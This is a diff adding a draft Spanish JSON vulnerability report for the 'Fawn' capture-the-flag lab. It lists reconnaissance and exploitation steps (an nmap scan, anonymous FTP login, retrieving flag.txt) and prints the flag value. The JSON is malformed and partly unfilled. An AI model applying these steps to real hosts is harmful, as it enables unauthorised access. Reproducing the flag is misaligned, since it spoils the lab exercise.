@@ -1,0 +1,30 @@
+{
+    "título_vulnerabilidad": "",
+    "tipo_vulnerabilidad": "",
+    "id_activo": "",
+    {
+    "objetivo": "Fawn"
+    "titulo_vulnerabilidad": "simple brute-forcing attack ftp",
+    "tipo_vulnerabilidad": "",
+    "id_activo": "",
+    "descripción_vulnerabilidad": "Se identifica el servicio 21/tcp ftp abierto y se usa la credencial por defecto anonymous para entrar a la maquina victima",
+    "url_afectada": "10.129.1.14",
+    "prueba_de_concepto": {
+      "pasos_para_reproducir": [
+      "1.ping -c 1 10.129.1.14",
+      "2.sudo nmap -p- --open --min-rate 5000 -sV -sS -n -Pn -vvv 10.129.1.14 -oG allPorts",
+      "3.sudo apt-get install -y ftp"
+      "4.ftp 10.129.1.14"
+      "5.anonymous",
+      "6.get flag.txt"
+      "7.exit"
+      "8.cat flag.txt"
+      "035db21c881520061c53e0536e44f815"
+        
+      ]
+    },
+    "impacto_o_criticiad": "",
+    "sugerencia_de_solución": "",
+    "explotabilidad": "",
+    "cwe": 0
+  }
